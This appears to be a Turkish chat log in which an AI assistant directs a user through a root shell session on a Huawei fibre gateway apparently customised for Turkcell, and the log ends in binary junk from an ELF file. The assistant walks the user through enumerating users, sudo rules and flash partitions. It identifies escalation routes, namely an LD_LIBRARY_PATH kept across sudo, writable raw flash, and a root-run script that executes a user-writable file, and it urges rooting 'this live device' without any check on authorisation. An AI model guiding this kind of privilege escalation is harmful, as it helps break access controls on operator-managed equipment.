/etc/wap/dm.cfg/HWSOC1V662v2.cfg
/etc/wap/dm.cfg/HWSOC1W626E.cfg
/etc/wap/dm.cfg/HWSOC1WA8021V5-PRO.cfg
/etc/wap/dm.cfg/HWSOC1WA8021V5v1.cfg
/etc/wap/dm.cfg/HWSOC1WA8021V5v2.cfg
/etc/wap/dm.cfg/HWSOC2EG6145A5v1.cfg
/etc/wap/dm.cfg/HWSOC2EG8040F5-S.cfg
/etc/wap/dm.cfg/HWSOC2EG8040F5.cfg
/etc/wap/dm.cfg/HWSOC2EG8120L5v1.cfg
/etc/wap/dm.cfg/HWSOC2EG8141A5.cfg
/etc/wap/dm.cfg/HWSOC2EG8143A5v1.cfg
/etc/wap/dm.cfg/HWSOC2HG8040F5.cfg
/etc/wap/dm.cfg/HWSOC2HG8042M5.cfg
/etc/wap/dm.cfg/HWSOC2HG8045A5v1.cfg
/etc/wap/dm.cfg/HWSOC2HG8120L5.cfg
/etc/wap/dm.cfg/HWSOC2HG8141A5.cfg
/etc/wap/dm.cfg/HWSOC2HG8143A5v1.cfg
/etc/wap/dm.cfg/HWSOC2HG8245Hv5v1.cfg
/etc/wap/dm.cfg/HWSOC2HG8546M5v1.cfg
/etc/wap/dm.cfg/HWSOC2HS8144Cv5.cfg
/etc/wap/dm.cfg/HWSOC2HS8145C6v1.cfg
/etc/wap/dm.cfg/HWSOC2HS8145Cv3.cfg
/etc/wap/dm.cfg/HWSOC2HS8145Cv5.cfg
/etc/wap/dm.cfg/HWSOC2HS8145Cv5_v2.cfg
/etc/wap/dm.cfg/HWSOC2HS8145Cv5_v3.cfg
/etc/wap/dm.cfg/HWSOC2HS8145Cv6.cfg
/etc/wap/dm.cfg/HWSOC2HS8346Rv2.cfg
/etc/wap/dm.cfg/HWSOC2HS8346Rv3.cfg
/etc/wap/dm.cfg/HWSOC2HS8346Rv4.cfg
/etc/wap/dm.cfg/HWSOC2HS8545Mv2.cfg
/etc/wap/dm.cfg/HWSOC2HS8545Mv3.cfg
/etc/wap/dm.cfg/HWSOC2HS8545Mv4.cfg
/etc/wap/dm.cfg/HWSOC2P670E.cfg
/etc/wap/dm.cfg/HWSOC3EG8247W5-8Tv1.cfg
/etc/wap/dm.cfg/HWSOC3Game-RT-X.cfg
/etc/wap/dm.cfg/HWSOC3HG8245X6-10.cfg
/etc/wap/dm.cfg/HWSOC3HG8245X6.cfg
/etc/wap/dm.cfg/HWSOC3HG8245X6v1.cfg
/etc/wap/dm.cfg/HWSOC3HG8245X6v2.cfg
/etc/wap/dm.cfg/HWSOC3HG9245X6.cfg
/etc/wap/dm.cfg/HWSOC3K654p.cfg
/etc/wap/dm.cfg/HWSOC3LG8245X6-20.cfg
/etc/wap/dm.cfg/HWSOC3LG8245X6-50.cfg
/etc/wap/dm.cfg/HWSOC3SGP200W.cfg
/etc/wap/dm.cfg/MA5875-8E8P.cfg
/etc/wap/dm.cfg/T623.cfg
/etc/wap/notify_list.txt
/etc/wap/pdt_ssp_log.cfg
/etc/wap/spec/bbsp/spec_v3_5115t_dualcore.cfg
/etc/wap/spec/bbsp/spec_v3_5118.cfg
/etc/wap/spec/bbsp/spec_v3_5118_pol.cfg
/etc/wap/spec/bbsp/spec_v3_bbsp_common.cfg
/etc/wap/spec/bbsp/spec_v3_bbsp_common2.cfg
/etc/wap/spec/bbsp/spec_v3_bbsp_common_ap.cfg
/etc/wap/spec/bbsp/spec_v3_bbsp_old.cfg
/etc/wap/spec/bbsp/spec_v3_bbsp_old_default.cfg
/etc/wap/spec/bbsp/spec_v3_hwsoc1.cfg
/etc/wap/spec/bbsp/spec_v3_hwsoc1_ap.cfg
/etc/wap/spec/bbsp/spec_v3_hwsoc1_dbus.cfg
/etc/wap/spec/bbsp/spec_v3_hwsoc1_dualcore.cfg
/etc/wap/spec/bbsp/spec_v3_hwsoc2.cfg
/etc/wap/spec/bbsp/spec_v3_hwsoc2_ap.cfg
/etc/wap/spec/bbsp/spec_v3_hwsoc2_default.cfg
/etc/wap/spec/bbsp/spec_v3_hwsoc4.cfg
/etc/wap/wap_ssp_log.cfg
WAP(Dopra Linux) #


Çok farklı bir sistem yapısı var — `sdk_init.sh` yok, `/etc/init.d/` yok. Boot zincirini anlamak için şunları çalıştır:

```sh
cat /etc/profile
```

```sh
cat /etc/inittab 2>/dev/null || cat /init 2>/dev/null | head -30
```

```sh
ps | head -30
```

```sh
ls /etc/wap/*.sh 2>/dev/null; ls /etc/wap/customize/common/recover_turkcell*.sh
```


WAP(Dopra Linux) # cat /etc/profile
# /etc/profile
# init bash prompt and enviroment.

alias ll="ls -l"
alias ..="cd .."

login_user=`eval echo \`ps | grep "Get username"\` | cut -d " " -f 2`
if [ $login_user != "root" ]; then
        alias reboot="sudo reboot"
fi

if [ -f /usr/sbin/saf-huawei ]; then
        alias su="/bin/busybox false"
        alias saf-huawei="sudo saf-huawei"
fi

PATH="/bin:/usr/bin:/sbin:/usr/sbin"
export LD_LIBRARY_PATH=/lib:/lib/omci_module:/lib/oam_module

export DBUS_SESSION_BUS_ADDRESS=unix:path=/var/run/dbus/system_bus_socket

export LANG=zh_CN.UTF-8
export LC_ALL=zh_CN.UTF-8

export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/lib/glib-2.0

if [ -f /usr/osgi/java ]; then
        export PATH=$PATH:/usr/osgi/bin
        export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/osgi/lib:/usr/osgi/lib/aarch32:/usr/osgi/lib/aarch32/jli:/usr/osgi/lib/aarch32/server
fi

#PS1="\[\033[32m\]\h \w\[\033[m\] \\$ "
PS1="WAP(Dopra Linux) # "

#���flash��boardinfo�Ǽ��ܵ�����ܵ�/varĿ¼
if [ ! -f /var/decrypt_boardinfo ] && [ -f /bin/decrypt_boardinfo ]; then
        if [ -f /mnt/jffs2/hw_boardinfo ]; then
                decrypt_boardinfo -s /mnt/jffs2/hw_boardinfo -d /var/decrypt_boardinfo
                if [ -f /var/decrypt_boardinfo ]; then
                        chmod 660 /var/decrypt_boardinfo
                fi
        fi
fi

#���boardinfo�Ǽ��ܵģ�ֻ�ܲ������ܺ���ļ�
txt_boardinfo=/mnt/jffs2/hw_boardinfo

if [ -f /var/decrypt_boardinfo ]; then
        txt_boardinfo=/var/decrypt_boardinfo
fi

aiscli_enble=`GetFeature HW_FT_AIS_APP_TELNET_ONT`
var_xpon_mode=`cat $txt_boardinfo | grep "0x00000001" | cut -c38-38`
if [ -e /bin/aiscli ] && [ $aiscli_enble = 1 ] && [ ${var_xpon_mode} == "1" ];then
        spec_ps1=`GetSpec SSMP_SPEC_CLI_SHELL_PROMPT_STR`
        PS1=$spec_ps1
fi

#set core dump according to the hw_wap_debug.config file
var_file_name=/proc/wap_proc/debug_config
if [ -e $var_file_name ]; then
        var_find_core_flag=HW_WAP_AUTO_CORE_DUMP
        var_find_mount=HW_WAP_AUTO_MOUNT
        var_core_flag=`grep $var_find_core_flag $var_file_name | sed 's/[^0]*//' | sed 's/0x//'`
        var_core_mount=`grep $var_find_mount $var_file_name | sed 's/[^\"]*//' | sed 's/"//' | cut -f 1 -d '"'`
        if [ "$var_core_flag" != "" ] && [ "$var_core_flag" != "FFFFFFFF" ] && [ $var_core_flag -eq 1 ]; then
                ulimit -c unlimited
                echo "profile open core dump, flag=$var_core_flag"
                if [ "$var_core_mount" != "" ];then
                        mount $var_core_mount
                        if [ $? = 0 ];then
                                echo "/mnt/nfs/core-%e-%p-%t" > /proc/sys/kernel/core_pattern
                                echo "profile 'mount $var_core_mount' successful"
                        else
                                echo "/var/core-%e-%p-%t" > /proc/sys/kernel/core_pattern
                                echo "profile 'mount $var_core_mount' failed"
                                route
                                ifconfig
                        fi
                else
                        echo "/var/core-%e-%p-%t" > /proc/sys/kernel/core_pattern
                        echo "profile 'mount $var_core_mount' failed"
                fi
        else
                ulimit -c 0
                echo "profile close core dump, flag=$var_core_flag"
        fi
else
        ulimit -c 0
        echo "profile close core dump"
fi

umask 0077

LOGNAME=root

HOSTNAME=`/bin/hostname`
HISTSIZE=0

TMOUT=300

PAGER=more

export PATH PS1 USER LOGNAME HOSTNAME HISTSIZE PAGER TMOUT

ft_no_boot_wifi=`GetFeature FT_WLAN_NO_BOOT_WIFI`

if [ -d /usr/lib/cl2400_host_pkg ]; then
        if [ -f /mnt/jffs2/replace_celeno_ko ]; then
        export cl2400_root=/var/cl2400_host_pkg/cl2400
        elif [ $ft_no_boot_wifi -eq 1 ]; then
        export cl2400_root=/mnt/jffs2/app/cl2400_host_pkg/cl2400
        else
        export cl2400_root=/usr/lib/cl2400_host_pkg/cl2400
        fi
        export clr_install_dir_cl2400=$cl2400_root
        export PATH=$PATH:$cl2400_root/bin:$cl2400_root/scripts
        export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$cl2400_root/lib
        export clr_cfg_dir_cl2400_24g=/var/cl2400_24g
        export clr_cfg_dir_cl2400=/var/cl2400
fi

export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/mnt/jffs2/equipment/lib

#Deal serial parameter
if [ -f /bin/stty ]; then
    stty -ixon
fi

# Running the local scripts from the user
for i in /etc/profile.d/*.sh ; do
        if [ -x $i ]; then
                . $i
        fi
done
unset i
WAP(Dopra Linux) # cat /etc/inittab 2>/dev/null || cat /init 2>/dev/null | head
-30
#
# inittab       This file describes how the INIT process should set up
#               the system during the initial booting process.

# Ssystem initialization starts here

::sysinit:/etc/rc.d/rc.ttyinit
#console::sysinit:/etc/rc.d/rc.sysinit

#::sysinit:/etc/rc.d/rc.sysinit
#ttyAMA1::respawn:-/bin/sh
ttyAMA1::respawn:-/bin/"console.sh"
#::respawn:/sbin/getty 115200 ttyAMA0
#tty1::respawn:/sbin/getty 9600 tty1
#tty2::respawn:/sbin/getty 9600 tty2
#tty3::respawn:/sbin/getty 9600 tty3
#tty4::respawn:/sbin/getty 9600 tty4
#tty5::respawn:/sbin/getty 9600 tty5

::shutdown:/etc/rc.d/rc.shutdown
::ctrlaltdel:/bin/false
WAP(Dopra Linux) # ps | head -30
  PID USER       VSZ STAT COMMAND
    1 root      1496 S    init
    2 root         0 SW   [kthreadd]
    3 root         0 SW   [ksoftirqd/0]
    5 root         0 SW<  [kworker/0:0H]
    7 root         0 SW   [rcu_sched]
    8 root         0 SW   [rcu_bh]
    9 root         0 SW   [migration/0]
   12 root         0 SW   [migration/1]
   13 root         0 SW   [ksoftirqd/1]
   14 root         0 SW   [kworker/1:0]
   15 root         0 SW<  [kworker/1:0H]
   16 root         0 SW   [kdevtmpfs]
   17 root         0 SW<  [netns]
  119 root         0 SW   [khungtaskd]
  120 root         0 SW<  [writeback]
  122 root         0 SW<  [crypto]
  123 root         0 SW<  [bioset]
  125 root         0 SW<  [kblockd]
  148 root         0 SW   [kworker/0:1]
  163 root         0 SW   [kswapd0]
  164 root         0 SW<  [vmstat]
  314 root         0 SW<  [bioset]
  315 root         0 SW<  [bioset]
  316 root         0 SW<  [bioset]
  317 root         0 SW<  [bioset]
  332 root         0 SW<  [bioset]
  338 root         0 SW<  [bioset]
  345 root         0 SW   [kboxd]
  351 root         0 SW<  [deferwq]
WAP(Dopra Linux) # ls /etc/wap/*.sh 2>/dev/null; ls /etc/wap/customize/common/re
cover_turkcell*.sh
/etc/wap/customize/common/recover_turkcell.sh
/etc/wap/customize/common/recover_turkcell_hgw.sh
WAP(Dopra Linux) #

Boot zinciri netleşiyor. Kritik bilgiler:

- **`/etc/inittab`**: Boot → `/etc/rc.d/rc.ttyinit` → sonra `/bin/console.sh`
- **`/etc/profile`**: Her shell oturumunda `/mnt/jffs2/` okuyor + `LD_LIBRARY_PATH`'e `/mnt/jffs2/equipment/lib` ekliyor

Şimdi asıl boot script'ini ve tüm process'leri görelim:

```sh
cat /etc/rc.d/rc.ttyinit
```

```sh
cat /bin/console.sh
```

```sh
ps | grep -v "\[" | head -50
```

```sh
ls /etc/profile.d/ 2>/dev/null
```


WAP(Dopra Linux) # cat /etc/rc.d/rc.ttyinit
cat: can't open '/etc/rc.d/rc.ttyinit': Permission denied
WAP(Dopra Linux) # cat /bin/console.sh
#/bin/sh

if [ -n "$WAP_SHELL" ]
then
    echo "WAP mode is running,do not start it again!Type 'exit' to return WAP mode."
    return 1
fi


sleep 3

echo "Press any key to get started"
read -n1 name

port=23
ctree="/mnt/jffs2/hw_ctree.xml"
ctreeuse="/var/hw_ctreeuse.xml"
ctreeusegz="/var/hw_ctreeuse.xml.gz"
temp_ctree="/var/hw_aes_temp_ctree.xml"
var_pack_temp_dir=/bin/
tmp_value=23

#  function - get the attribute value
#  $1:ctree name, $2:node name, $3:attribute name
get_attribute_value()
{
  cfgtool gettofile $1 $2 $3
  if [ 0 -ne $? ]
  then
        return 1
  else
        read tmp_value < /var/cfgtool_ret
        if [ 0 -ne $? ]
        then
                echo "ERROR::Failed to read $3 value!"
                rm -f /var/cfgtool_ret
                return 1
        fi
  fi

  rm -f /var/cfgtool_ret
}


#get custom information
#1.decrypt 2.gunzip

cp -f $ctree $ctreeuse
$var_pack_temp_dir/aescrypt2 1 $ctreeuse  $temp_ctree
mv -f $ctreeuse   $ctreeusegz

#Сϵͳ�л������Ĵ�����ֱ�Ӽ��ܵģ�ѹ�������Ǽٵģ�û������ѹ��
gunzip -f $ctreeusegz
if [ 0 -ne $? ]
then
mv -f $ctreeusegz $ctreeuse
fi

get_attribute_value $ctreeuse InternetGatewayDevice.UserInterface.X_HW_CLITelnetAccess TelnetPort
port=$tmp_value

rm -f $ctreeuse

echo "telnet port:$port"

telnet 127.0.0.1 $port
WAP(Dopra Linux) # ps | grep -v "\[" | head -50
  PID USER       VSZ STAT COMMAND
    1 root      1496 S    init
  569 srv_ssmp  1980 S    collect_pipe
 1660 srv_ssmp 19488 S    ssmp
 1661 srv_cms  13356 S    cms
 1662 srv_comm 11708 S    lsvd
 1663 root     11724 S    comm -l bbsp wifi cms ethoam cwmp bulk usb_mngt dlna
 1664 srv_ret  10984 S    ret_server
 1665 srv_bbsp 30744 S    bbsp
 1666 srv_amp  16344 S    amp
 1668 srv_igmp 12656 S    igmp
 1669 srv_etho 12292 S    ethoam
 1670 srv_emdi 11444 S    emdi
 1672 cfg_cwmp 16612 S    cwmp
 1685 cfg_omci 15380 S    omci
 1692 srv_wifi 23728 S    wifi -d 5 -n 60
 1845 root     11908 S    procmonitor ssmp bbsp amp voice_h248sip
 1856 srv_bbsp  2032 S    ip6tables-restore -n
 1999 srv_bbsp  2064 S    iptables-restore -n
 2141 srv_bbsp  1568 S    pppd nic-wan1 unit 257 maxfail 0 persist debug echo_
 2158 srv_bbsp 11532 S    dhcpd
 2243 srv_voic 24908 S    voice_h248sip -d 3 -n 10
 2247 srv_clid 14996 S    clid -rpc
 2263 srv_upnp 12696 S    upnpdmain !br+ br0 49652
 2268 srv_clid  1352 S    dropbear -r /etc/dropbear/dropbear_rsa_host_key -p 1
 2271 srv_cms  10956 S    sntp
 2324 srv_clid  1508 S    /bin/sh --wap
 2355 srv_amp  10844 S    ldspcli
 2363 srv_bbsp  1492 S    dnsmasq --conf-file=/var/dnsmasq_br0.conf
 2367 srv_bbsp  1492 S    dnsmasq --conf-file=/var/dnsv6/dnsmasq_br0.conf
 2411 srv_kmc  11100 S    kmc
 2503 root     11360 S    wificli
 2547 root      1508 S    {exe} ash /bin/console.sh
 2703 srv_wifi  1328 S    app_sdt_hisi s
 2894 cfg_wifi  4708 S    hostapd -d -K -t -e/tmp/myramdom -f/tmp/hostapd_vap0
 2901 cfg_wifi  4708 S    hostapd -d -K -t -e/tmp/myramdom -f/tmp/hostapd_vap4
 2942 srv_cage 15628 S    cagent
 2943 srv_apm  13536 SN   apm
 2944 srv_udm  14412 S    udm
 2982 srv_appm 18212 S    app_m
 2999 srv_web  17148 S    web -s 13 -c 8449 -s 14 -c 12546 -s 15 -c 12547 -s 1
 3023 srv_clid  1404 S    dropbear -r /etc/dropbear/dropbear_rsa_host_key -p 1
 3046 srv_clid  1508 S    /bin/sh --wap
 3047 srv_clid  1404 S    dropbear -r /etc/dropbear/dropbear_rsa_host_key -p 1
 3053 srv_clid  1520 S    /bin/sh --login
 4476 srv_clid  1496 R    ps
 4478 srv_clid  1496 R    head -50
WAP(Dopra Linux) # ls /etc/profile.d/ 2>/dev/null
WAP(Dopra Linux) #


Çok önemli bulgular:

1. **`console.sh`**: Telnet CLI'a bağlanıyor, `sdk_init.sh` çağrısı yok
2. **Shell `srv_clid` kullanıcısı altında çalışıyor** — `#` promptu yanıltıcı, aslında root değilsin
3. **`/etc/profile.d/` boş** — oraya script koyma yolu yok (zaten SquashFS, read-only)
4. **`sdk_init.sh` bu firmware'da hiç yok** — patch'in çalışmamasının sebebi bu

Şimdi mevcut yetkini ve alternatif yolları kontrol edelim:

```sh
id
```

```sh
whoami
```

```sh
sudo sh 2>&1
```

```sh
ls -la /etc/rc.d/
```

```sh
touch /mnt/jffs2/test_write 2>&1; ls -la /mnt/jffs2/test_write 2>/dev/null; rm /mnt/jffs2/test_write 2>/dev/null
```

```sh
cat /mnt/jffs2/hw_bootcfg.xml
```


WAP(Dopra Linux) # id
uid=3030(srv_clid) gid=2002(service) groups=5(tty),6(disk),500(kmc),2000(osgi),2001(config),2002(service)
WAP(Dopra Linux) # whoami
srv_clid
WAP(Dopra Linux) # sudo sh 2>&1
Sorry, user srv_clid is not allowed to execute '/bin/sh' as root on (none).
WAP(Dopra Linux) # ls -la /etc/rc.d/
dr-xr-xr-x    3 root     root            86 Mar 16  2022 .
drwxr-xr-x   17 root     root           925 Mar 16  2022 ..
-r-xr-x---    1 root     root           481 Mar 16  2022 rc.shutdown
dr-xr-xr-x    2 root     root            57 Mar 16  2022 rc.start
-r-xr-x---    1 root     root          2980 Mar 16  2022 rc.sysinit
-r-xr-x---    1 root     root           933 Mar 16  2022 rc.ttyinit
WAP(Dopra Linux) # touch /mnt/jffs2/test_write 2>&1; ls -la /mnt/jffs2/test_writ
e 2>/dev/null; rm /mnt/jffs2/test_write 2>/dev/null
-rw-------    1 srv_clid service          0 Jan  1 00:24 /mnt/jffs2/test_write
WAP(Dopra Linux) # cat /mnt/jffs2/hw_bootcfg.xml
<root>
<sys_boot start_area="0" change_flag="0" main_state="0" slave_state="0"/>
</root>
WAP(Dopra Linux) #


Kritik bilgiler:
- `srv_clid` kullanıcısısın ama **`/mnt/jffs2/`'ye yazabiliyorsun**
- `disk` grubundasın — bu çok önemli olabilir

Şunları kontrol et:

```sh
sudo -l
```

```sh
ls /etc/rc.d/rc.start/
```

```sh
ls -la /dev/mtd* 2>/dev/null | head -10
```

```sh
cat /proc/mtd
```

```sh
groups
```


WAP(Dopra Linux) # sudo -l
Matching Defaults entries for srv_clid on (none):
    env_keep+=LD_LIBRARY_PATH

User srv_clid may run the following commands on (none):
    (root) NOPASSWD: /sbin/BackStackInfo.sh
    (root) NOPASSWD: /sbin/BackStackInfo.sh
    (root) NOPASSWD: /bin/cat /proc/slabinfo, /bin/dmesg, /bin/cat
        /proc/net/ip_conntrack, /bin/cat /proc/net/nf_conntrack_expect,
        /bin/cat /proc/net/nf_conntrack_expect_save, /bin/cat
        /proc/kbox/deviceinfo, /bin/cat /proc/kbox/mem, /bin/cat
        /proc/kbox/regions/oom_extend, /bin/cat /proc/modules,
        /bin/collect_pon_stat.sh, SETENV:
        /opt/upt/framework/saf/rootfs/sbin/logread, /usr/sbin/saf-huawei,
        /bin/ubus
    (root) NOPASSWD: /sbin/reboot, COMMON_LXC, /bin/customize_del_file.sh,
        /bin/customize_kill_proc.sh, /bin/create_factory_file.sh,
        /bin/customize_cert_proc.sh
    (root) NOPASSWD: /bin/hw_restore_manufactory_exec.sh, /bin/restorehwmode.sh
    (root) NOPASSWD: /bin/keyfilemng save, /bin/keyfilemng check
    (root) SETENV: NOPASSWD: /opt/upt/framework/saf/rootfs/sbin/logread,
        /usr/sbin/saf-huawei, /bin/ubus
WAP(Dopra Linux) # ls /etc/rc.d/rc.start/
0.wap_init.sh  1.sdk_init.sh
WAP(Dopra Linux) # ls -la /dev/mtd* 2>/dev/null | head -10
crw-rw----    1 root     disk       90,   0 Jan  1  1970 /dev/mtd0
crw-rw----    1 root     disk       90,   1 Jan  1  1970 /dev/mtd0ro
crw-rw----    1 root     disk       90,   2 Jan  1  1970 /dev/mtd1
crw-rw----    1 root     disk       90,  20 Jan  1  1970 /dev/mtd10
crw-rw----    1 root     disk       90,  21 Jan  1  1970 /dev/mtd10ro
crw-rw----    1 root     disk       90,  22 Jan  1  1970 /dev/mtd11
crw-rw----    1 root     disk       90,  23 Jan  1  1970 /dev/mtd11ro
crw-rw----    1 root     disk       90,  24 Jan  1  1970 /dev/mtd12
crw-rw----    1 root     disk       90,  25 Jan  1  1970 /dev/mtd12ro
crw-rw----    1 root     disk       90,   3 Jan  1  1970 /dev/mtd1ro
WAP(Dopra Linux) # groups
/bin/sh: groups: not found
WAP(Dopra Linux) #


**BÜYÜK BULGULAR:**

1. **`1.sdk_init.sh` VAR!** → `/etc/rc.d/rc.start/1.sdk_init.sh`
2. **MTD'ler `disk` grubuna açık** → raw flash okuma/yazma yapabilirsin
3. **`sudo` ile `LD_LIBRARY_PATH` korunuyor** + `ubus` root olarak çalışıyor → privilege escalation vektörü

Hemen `sdk_init.sh`'ı okuyalım — patch'in neden çalışmadığını göreceğiz:

```sh
cat /etc/rc.d/rc.start/1.sdk_init.sh
```

```sh
cat /etc/rc.d/rc.start/0.wap_init.sh
```

```sh
cat /proc/mtd
```
WAP(Dopra Linux) # cat /etc/rc.d/rc.start/1.sdk_init.sh
cat: can't open '/etc/rc.d/rc.start/1.sdk_init.sh': Permission denied
WAP(Dopra Linux) # cat /etc/rc.d/rc.start/0.wap_init.sh
cat: can't open '/etc/rc.d/rc.start/0.wap_init.sh': Permission denied
WAP(Dopra Linux) # cat /proc/mtd
dev:    size   erasesize  name
mtd0: 00200000 00040000 "bootcode"
mtd1: 1fe00000 00040000 "ubilayer_v5"
mtd2: 0003e000 0003e000 "flash_configA"
mtd3: 0003e000 0003e000 "flash_configB"
mtd4: 0003e000 0003e000 "slave_paramA"
mtd5: 0003e000 0003e000 "slave_paramB"
mtd6: 0502a000 0003e000 "allsystemA"
mtd7: 0502a000 0003e000 "allsystemB"
mtd8: 0003e000 0003e000 "wifi_paramA"
mtd9: 0003e000 0003e000 "wifi_paramB"
mtd10: 0022e000 0003e000 "keyfile"
mtd11: 0141a000 0003e000 "file_system"
mtd12: 1273a000 0003e000 "app_system"
WAP(Dopra Linux) #



Dosyalar root-only ama **MTD'ler disk grubuna açık** — raw flash'tan okuyabiliriz! Ayrıca `sudo ubus` root olarak çalışıyor.

Şunları dene:

```sh
sudo /bin/ubus list
```

```sh
grep -r "control_audit" /bin/ /sbin/ /usr/bin/ /usr/sbin/ 2>/dev/null
```

```sh
strings /dev/mtd6ro 2>/dev/null | grep -i "control_audit" | head -5
```

```sh
dd if=/dev/mtd6ro bs=4096 count=20000 2>/dev/null | strings | grep -B2 -A2 "control_audit" | head -20
```


WAP(Dopra Linux) # sudo /bin/ubus list
sudo: /bin/ubus: command not found
WAP(Dopra Linux) # grep -r "control_audit" /bin/ /sbin/ /usr/bin/ /usr/sbin/ 2>/
dev/null
/bin/audit:cd /mnt/jffs2/Install_gram;./control_audit.sh --start
/bin/audit:/mnt/jffs2/Install_gram/control_audit.sh
/bin/audit:/mnt/jffs2/Install_gram/control_audit.sh --stop
/bin/audit:cd /mnt/jffs2/Install_gram/; ./control_audit.sh --start
/bin/hw_restore_manufactory_exec.sh:    if [ -f /mnt/jffs2/Install_gram/control_audit.sh ] ; then
/bin/hw_restore_manufactory_exec.sh:        /mnt/jffs2/Install_gram/control_audit.sh --stop >/dev/null 2>&1
/bin/qoe:cd /mnt/jffs2/Install_gram;./control_audit.sh --start
/bin/qoe:/mnt/jffs2/Install_gram/control_audit.sh
/bin/qoe:/mnt/jffs2/Install_gram/control_audit.sh --stop
/bin/qoe:cd /mnt/jffs2/Install_gram/; ./control_audit.sh --start
/bin/restorehwmode.sh:    if [ -f /mnt/jffs2/Install_gram/control_audit.sh ] ; then
/bin/restorehwmode.sh:        /mnt/jffs2/Install_gram/control_audit.sh --stop >/dev/null 2>&1
/bin/ssmp:/mnt/jffs2/Install_gram/control_audit.sh
/bin/ssmp:cd /mnt/jffs2/Install_gram/; ./control_audit.sh --stop
WAP(Dopra Linux) # strings /dev/mtd6ro 2>/dev/null | grep -i "control_audit" | h
ead -5
WAP(Dopra Linux) # dd if=/dev/mtd6ro bs=4096 count=20000 2>/dev/null | strings |
 grep -B2 -A2 "control_audit" | head -20
/bin/sh: strings: not found
WAP(Dopra Linux) #



**İŞTE CEVAP!** Patch'in çalışmamasının sebebi: **yanlış dizin!**

Doğru yol:
```
/mnt/jffs2/Install_gram/control_audit.sh    ← DOĞRU
/mnt/jffs2/control_audit.sh                  ← BİZİM YAZDIĞIMIZ (YANLIŞ!)
```

Ve daha da önemlisi — **şu an bu canlı cihazda root alabilirsin!** Çünkü:

```
sudo /bin/hw_restore_manufactory_exec.sh    ← root olarak çalışır
  → /mnt/jffs2/Install_gram/control_audit.sh --stop   ← SENİN yazabileceğin dosya!
```

Yani sudo'nun çağırdığı script, senin yazabileceğin bir dosyayı root olarak çalıştırıyor.

Önce bakalım factory reset riski var mı:

```sh
cat /bin/audit
```

```sh
cat /bin/hw_restore_manufactory_exec.sh | head -30
```

```sh
cat /bin/restorehwmode.sh | head -30
```

WAP(Dopra Linux) # cat /bin/audit
ELF(/4$�4(␦p������pp444444(�(�����
                                  �
                                   h�����
                                         �
                                          ��Q�tdR�td���
                                                       �
                                                        LL/lib/ld-musl-arm.so.1��|�H[
                                                                                     �_�=ZD@EcV<dxl��/5%Fw�.��G(��S��n!b2zPR�6ta �f�;>YhT���{Q7^e$U)-OM��m��B�q�oN0���]�s
�1�?A}��yJ*K�C��,I�\�#��3���j␦9�ki:�48��X�r+u&   �      vp�~���
����$���Ce      Z��
 @@%
     P�,#�-�@����A�G�   `��P    @�      ehjlnprsuwy{}��������������������������������������~�ڮ
�ەj^�{��5�8��1�)��ڛy�L\�E�!T���R��`$�-7�Ie���wT<���@�qh��\�;sXi\.�2k�|�J�CE��c�I���Y�y�z3��v\����2b��I�ޢ�騜0�L�׿�W -�
                                                                                   ����|nM{m13�#�f̅��v���4� ��Zy�
                                                                                                                L_�٭�E�qX
 4      �I�C�$)
�,���u �U�T�:�����b��"�f��Y ? ��i�'L�{�C�j�     Y)�
r��/�����v}␦�e3�y��E���D.��     ��T:' y  PD
                                           6
<q(
   �
�3
  �
   �5D
,V�   �
   c    �N�
           �
            �^�
               �        �:@
�BD                        �
W� +
gD�
  R
   df�

      �al
         n
          �d�
             5  PQ
                  /
                   �s�
                      !
TmP
   �
@/\
   �    ,6
          4C�
�J<
�l �
  �
   �J<
      =�R$
          �     t>x
                   �
TU�
G|
  �6
    dq�
       ,3T
                �P�
`                  ��y
 �E
   `Rp
      Q
�1�
DxxR
   �$)
�
 /
  �
   �<�

�n�
   �
XL�
<6H=
   h
    �Q  �YX
           n
�>�

   K�
     4�
       1
       $        �FL
�D�                �
   $�L�
       �
,p
  �
   1�
     �
      |=�
         ��:
            �
�k�
   5
    ��[l
        �
         �;�
            MdPP
                �
                 `rD
                    Xjp
                       t
                        �vL
                           �-|
                              �
                               t7
                                 w�
                                   �R
                                    �   \]�
                                           ~dN4
��                                             �
�J�
   ``p
      C
       �SX
          �     8p�
                   <c�
                      i
                       ��2T
                           �   d�
@O�                              h

   �:
    �
     �
      �6�
         ��@�
             libclang_rt.builtins_s.solibunwind_s.so.1__aeabi_unwind_cpp_pr0__stack_chk_fail__stack_chk_guard__aeabi_unwind_cpp_pr1memset__aeabi_uidivmodlibl3_base_api.soWAN_IF_GetIpv6AddressWan_IF_ForeachWAN_IF_GetIPv6IfStateHW_Dns_GetHostByName4_NoCacheWAN_IF_IsIpv6OnlyWanWAN_IF_GetIfStateWAN_IF_IsTr069TypeWAN_IF_GetIpv4AddrAndMaskWAN_IF_IsInternetTypeHW_Dns_GetHostByName6_NoCacheWAN_IF_IsRouteWanlibhw_smp_pdt_common.soHW_DM_PDGetAttrHW_OS_IsFileAccesslibsmp_api.soatoiHW_SWM_GetMainAreaSoftwareVersionHW_CFGA_SetParaHW_CFGA_FreeCfgInfoHW_CFGA_GetParaFromGetHW_DM_GetUISoftwareVersionExHW_CFGA_GetParaFromSetHW_CFGA_AppendParaToOutputHW_DM_GetUIHardWareVersionlibbssp_common.sosprintf_sstrncpy_sHW_OS_IsDigitStrHW_OS_MutexInitHW_OS_MutexUnLockHW_XML_DBAppendAllParaToParaListHW_OS_StrCaseStrHW_OS_IpAddrToStrHW_OS_StrLenHW_OS_MutexLockmemcpy_smemset_sHW_OS_StrStrHW_OS_InetNtopHW_OS_StrToUInt32strcpy_sHW_PROC_DBG_TraceNHW_OS_StrCmpHW_OS_StrCaseCmpHW_Feature_IsSupportByFeatureNameHW_OS_StrChrHW_OS_PrintfHW_MSG_AsynSendHW_PROC_DBG_LastWordEventCenter_SubscribeEventlibhw_ssp_ssl.solibl2_base_api.soHW_XML_DBGetSigleParaHW_XML_DBFreeParaListHW_XML_DBAllocParaListlibhw_ssmp_adpt.solibhw_dns.sostrcat_smemmove_slibhw_l2m_api.solibpolarssl.so__cxa_finalize__deregister_frame_info_ITM_registerTMCloneTable_ITM_deregisterTMCloneTable__register_frame_info_init_finilibcfg_api.soHW_TIMER_ReleaseRealTimerHW_TIMER_CreateRealTimerHW_OS_SleepMsHW_OS_IsProcExist_ExHW_XML_DBSaveHW_XML_DBGetPara_ExHW_XML_DBIsObjExistlibl3_ext_api.soHW_XML_DBSetParalibhw_ssp_db.solibhw_smp_web_base.soHW_OS_P